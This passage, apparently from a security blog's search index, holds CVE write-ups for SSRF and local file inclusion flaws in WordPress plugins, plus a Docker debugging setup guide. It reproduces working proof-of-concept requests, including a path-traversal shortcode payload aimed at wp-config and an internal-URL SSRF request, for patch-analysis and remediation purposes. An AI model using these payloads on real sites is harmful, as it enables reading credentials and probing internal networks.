=\u003e 'Essential Blocks/' . ESSENTIAL_BLOCKS_VERSION, 'headers' =\u003e [ 'Accept' =\u003e 'image/*' ] ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from URL.', 'essential-blocks' ) ] ); return; } // Validate response $response_code = wp_remote_retrieve_response_code( $image_data ); if ( $response_code !== 200 ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid response from image URL.', 'essential-blocks' ) ] ); return; } // Security: Validate image content and size if ( ! $this-\u003eis_valid_image_content( $image_body ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Invalid image content provided.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); if ( ! $image_info ) { wp_send_json_error( [ 'message' =\u003e __( 'Unable to determine image format.', 'essential-blocks' ) ] ); return; } $mime_type = $image_info[ 'mime' ]; // Security: Only allow specific image MIME types $allowed_mime_types = [ 'image/jpeg', 'image/png', 'image/webp', 'image/gif' ]; if ( ! in_array( $mime_type, $all","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\reb_save_ai_generated_image() is registered as the callback for the action hook wp_ajax_save_ai_generated_image: add_action( 'wp_ajax_save_ai_generated_image', [ $this, 'eb_save_ai_generated_image' ] ); Thus, when accessing the endpoint /wp-admin/admin-ajax.php with the parameter action=save_ai_generated_image, eb_save_ai_generated_image() will be invoked. To reach the wp_remote_get() execution, the following conditions must be met: Check admin_nonce if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } By default, when accessing wp-admin, admin_nonce will be set and can be found by inspecting the code and searching for the admin_nonce keyword. Find admin_nonce by inspecting the code Check user-level if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } The upload_files capability requires the user to be Author-level or higher. POST request contains image_url and prompt params. if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service using Python: from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'requirements.txt', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) hello ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rSend a request with image_url pointing to a local service http://127.0.0.1:8001/test as an Author user: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?loggedout=true\u0026wp_lang=en_US Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C3cc12be38f8f94048309b7fcd31bd2187065311afecea7df5a9f01f5a207072b; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C38f09626eae6d08f6cdb9cd1ce781da26c2acdd8ef2fd1822d84a6d76c6c95ad; wp-settings-time-4=1761017121 action=save_ai_generated_image\u0026admin_nonce=9433571df4\u0026prompt=abc\u0026image_url=http://127.0.0.1:8001/test Response: Result: Read the stored file at http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png using BurpSuite Content read from the local service\rInformation\rThe content cannot be properly viewed in a browser because the content inside ai-generated-abc-1761019403.png ('hello') does not match the Content-Type: image/png returned, so the browser produces a rendering error. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersions ≤ 5.7.1 of Essential Blocks for Gutenberg are vulnerable to SSRF because they use wp_remote_get() to fetch uncontrolled URLs, allowing an Author user to send requests to internal addresses. The patch in 5.7.2 uses wp_safe_remote_get(), adds response code checks, validates MIME and image content, and thus mitigates SSRF. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rUpdate immediately to v5.7.2. Use wp_safe_remote_get() instead of wp_remote_get(). Always validate responses (HTTP code, MIME, content). Limit timeout, redirects, and file size. Carefully validate input data and user capabilities. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Essential Blocks for Gutenberg Plugin \u003c= 5.7.1 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["Web"],"collections":null,"content":"Continuing from the previous guide on installing WordPress in a local environment (see here), this post will show you how to set up WordPress with Docker — a modern, flexible, and easily shareable approach. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:0:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#"},{"categories":["Web"],"collections":null,"content":"Why Use Docker?\rDocker allows you to package the entire WordPress environment (PHP, MySQL, web server, and source code) into independent containers. This brings several key advantages: Environment consistency: Works the same everywhere, eliminating “works on my machine” issues. Easy setup and reset: Spin up or rebuild your environment in just a few commands. Isolation and security: Each container runs independently, avoiding software conflicts. Convenient development and debugging: Enable Xdebug, monitor logs, or tweak PHP settings without affecting your main system. Easy sharing: Just share the docker-compose.yml file — others can launch the exact same setup without manual installation. Docker is an optimal solution for developing, testing, and collaborating on WordPress projects — especially useful for developers, teams, or penetration testers who need a consistent, reproducible environment. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:1:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#why-use-docker"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacker in Docker\r","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-wordpress-for-hacker-in-docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rFirst, install Docker. It’s available on all major operating systems, with installation steps differing slightly per platform. See the official guide: https://www.docker.com/get-started/ Docker Compose\rInstead of manually starting containers with docker run, use Docker Compose — a tool that defines and manages multiple linked containers using a single configuration file (docker-compose.yml). For WordPress, you’ll need: A MySQL container for the database. A WordPress (PHP + web server) container for the site itself. Manually setting this up involves complex commands and configurations. With Docker Compose, everything is neatly handled in one YAML file: Easy setup: Run docker-compose up -d to get WordPress + MySQL instantly. Easy sharing: Anyone can use your docker-compose.yml to replicate your setup. Easy expansion: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines. Install instructions: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#prerequisites"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rFirst, install Docker. It’s available on all major operating systems, with installation steps differing slightly per platform. See the official guide: https://www.docker.com/get-started/ Docker Compose\rInstead of manually starting containers with docker run, use Docker Compose — a tool that defines and manages multiple linked containers using a single configuration file (docker-compose.yml). For WordPress, you’ll need: A MySQL container for the database. A WordPress (PHP + web server) container for the site itself. Manually setting this up involves complex commands and configurations. With Docker Compose, everything is neatly handled in one YAML file: Easy setup: Run docker-compose up -d to get WordPress + MySQL instantly. Easy sharing: Anyone can use your docker-compose.yml to replicate your setup. Easy expansion: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines. Install instructions: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites\rDocker\rFirst, install Docker. It’s available on all major operating systems, with installation steps differing slightly per platform. See the official guide: https://www.docker.com/get-started/ Docker Compose\rInstead of manually starting containers with docker run, use Docker Compose — a tool that defines and manages multiple linked containers using a single configuration file (docker-compose.yml). For WordPress, you’ll need: A MySQL container for the database. A WordPress (PHP + web server) container for the site itself. Manually setting this up involves complex commands and configurations. With Docker Compose, everything is neatly handled in one YAML file: Easy setup: Run docker-compose up -d to get WordPress + MySQL instantly. Easy sharing: Anyone can use your docker-compose.yml to replicate your setup. Easy expansion: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines. Install instructions: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker-compose"},{"categories":["Web"],"collections":null,"content":"Installing WordPress with Docker Compose and Xdebug\rThis section shows how to install WordPress using Docker Compose, with Xdebug integration for debugging directly in VS Code. This gives you a complete development setup that’s easy to debug and extend. Folder structure: . ├── wordpress ├── docker-compose.yml ├── Dockerfile ├── php.ini └── .vscode └── launch.json ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:2","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#installing-wordpress-with-docker-compose-and-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Environment\rCreate a new folder to store all configuration files: mkdir wordpress-docker \u0026\u0026 cd wordpress-docker ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:3","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-environment"},{"categories":["Web"],"collections":null,"content":"Create Dockerfile\rThe default WordPress image does not include Xdebug, so we’ll extend it with a Dockerfile. nano Dockerfile Content: FROM wordpress:latest # Install Xdebug RUN pecl install xdebug \u0026\u0026 docker-php-ext-enable xdebug ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:4","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-dockerfile"},{"categories":["Web"],"collections":null,"content":"Create docker-compose.yml\rNow create the file that configures the full environment: nano docker-compose.yml Content: services: db: image: mysql:latest container_name: wp_db restart: always environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress volumes: - db_data:/var/lib/mysql wordpress: build: . container_name: wp_app depends_on: - db ports: - \"80:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - ./wordpress:/var/www/html - ./php.ini:/usr/local/etc/php/conf.d/php.ini volumes: db_data: Info\rThe volumes: section handles data persistence and source code synchronization between your host machine and containers. Explanation: db_data:/var/lib/mysql Stores MySQL data persistently — your database won’t be lost if the container is removed. ./wordpress:/var/www/html Syncs WordPress source code between your machine and the container, allowing live editing. ./php.ini:/usr/local/etc/php/conf.d/php.ini Mounts your PHP/Xdebug config file for easy customization without rebuilding the image. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:5","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-docker-composeyml"},{"categories":["Web"],"collections":null,"content":"Create php.ini\rEnable Xdebug and adjust PHP settings. nano php.ini Content: zend_extension=xdebug xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=172.17.0.1 xdebug.client_port=9003 xdebug.log_level=0 upload_max_filesize = 64M post_max_size = 64M memory_limit = 128M max_execution_time = 300 max_input_time = 300 Explanation: The xdebug.* lines enable debugging in VS Code. The remaining lines increase upload and memory limits for PHP. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:6","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-phpini"},{"categories":["Web"],"collections":null,"content":"Create VS Code Launch Configuration\rCreate the VS Code config file to connect with Xdebug: mkdir .vscode \u0026\u0026 nano .vscode/launch.json Content: ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:7","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-vs-code-launch-configuration"},{"categories":["Web"],"collections":null,"content":"Install VS Code Extension\rOpen VS Code → Extensions (Ctrl + Shift + X) → Search and install: PHP Debug (by Xdebug) ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:8","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#install-vs-code-extension"},{"categories":["Web"],"collections":null,"content":"Run Docker Compose\rStart the environment: docker-compose up -d After the containers start, visit http://localhost to complete the WordPress installation. You can now set breakpoints in your PHP code and debug directly in VS Code. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:9","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#run-docker-compose"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MasterStudy LMS Plugin.","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe MasterStudy LMS plugin version ≤ 3.5.28 contains a Local File Inclusion (LFI) vulnerability that allows an unauthenticated attacker to control the file parameter in the include/require statement, enabling the inclusion or reading of local files on the server (e.g., configuration files containing credentials). This can lead to sensitive information disclosure and, in certain configurations, remote code execution. CVE ID: CVE-2025-32141 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 3.5.28 Patched Versions: 3.5.29 CVSS severity: Low (8.8) Required Privilege: Contributor Product: WordPress MasterStudy LMS Plugin ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - MasterStudy LMS: 3.5.28 (vulnerable) and 3.5.29 (patched). Diff tool - Meld or any diff tool to compare the two versions. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable Version: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } In the vulnerable version, the shortcode callback stm_lms_courses_categories directly passes the style value from $atts into STM_LMS_Templates::stm_lms_load_vc_element() without sanitization or validation — leading to a potential LFI. Patched Version: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts, $tag ); $atts['style'] = basename( sanitize_file_name( $atts['style'] ) ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } The patch sanitizes $atts['style'] using sanitize_file_name(), removing unsafe characters and preventing LFI. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) { extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path ); if ( ! file_exists( $element ) \u0026\u0026 strpos( $__template_name, 'style_' ) !== false ) { $element = str_replace( $__template_name, 'style_1', $element ); } if ( file_exists( $element ) ) { include $element; } else { echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' ); echo esc_html( ' ' . $element ); } } The include() statement uses $element returned from stm_lms_locate_vc_element(), which is influenced by $__template_name (the style parameter from the shortcode). Without validation, an attacker can manipulate it to include arbitrary files, leading to LFI. public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) { $located = false; foreach ( (array) $templates as $template ) { $folder = $template; if ( ! empty( $template_name ) ) { $template = $template_name; } if ( substr( $template, -4 ) !== '.php' ) { $template .= '.php'; } if ( empty( $custom_path ) ) { $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template; } } else { $located = locate_template( $custom_path ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/' . $custom_path . '.php'; } } if ( file_exists( $template_name ) ) { break; } } return apply_filters( 'stm_lms_locate_vc_element', $located, $templates ); } The stm_lms_locate_vc_element() function determines and returns the path of the template file (.php). If $template_name is provided, it overrides the default template name and ensures it ends with .php. The resulting file path becomes STM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php. For example, with style=payload, it returns: /srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a post with a shortcode that includes an LFI payload in the style attribute: POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1 Host: localhost {\"id\":260,\"content\":\"\u003c!-- wp:shortcode --\u003e\\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\\n\u003c!-- /wp:shortcode --\u003e\\n\\n\u003c!-- wp:paragraph --\u003e\\n\u003cp\u003e\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\"} Result: The debugger hits wp-config.php. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersions ≤ 3.5.28 of MasterStudy LMS are vulnerable to LFI via the style parameter in the shortcode due to unsanitized input used in an include statement. The patch in 3.5.29 sanitizes this input using sanitize_file_name() and basename(), preventing unauthorized file access. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rNever concatenate user input directly into file paths. Always sanitize or whitelist values before using them in include or require. Validate the resolved path to ensure it stays within the intended directory. Update to v3.5.29 to eliminate this LFI vulnerability. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress MasterStudy LMS Plugin \u003c= 3.5.28 is vulnerable to Local File Inclusion ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP REST Cache Plugin.","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe WP REST Cache plugin version ≤ 2025.1.0 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, possible code execution. CVE ID: CVE-2025-52716 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2025.1.0 Patched Versions: 2025.1.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress WP REST Cache Plugin ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP REST Cache: 2025.1.0 (vulnerable) and 2025.1.1 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } In the vulnerable version, $sub is the value returned by filter_input() taken from the GET parameter (?sub=...) in the URL using the filter FILTER_SANITIZE_FULL_SPECIAL_CHARS, which escapes \"\u003c\u003e\u0026 and characters with ASCII values below 32. This filter does not remove . (46) or / (47). $sub is concatenated into a string with the '.php' suffix and then include_onced without any protection against LFI. Patch: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php'; if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } The patch adds a check on the file location before include, ensuring the file to be loaded is located within the partials directory. If a path outside that directory is detected (e.g., due to ../), the plugin falls back to a safe default file. This eliminates the LFI vulnerability. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rsettings_page() is registered as the submenu callback: add_submenu_page( 'options-general.php', 'WP REST Cache', 'WP REST Cache', $capability, 'wp-rest-cache', [ $this, 'settings_page', ] ); So when the endpoint GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1 is accessed, settings_page() is invoked. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a web page with a form that automatically sends a request with the LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80//wp-admin/options-general.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"wp-rest-cache\"\u003e \u003cinput type=\"text\" name=\"sub\" 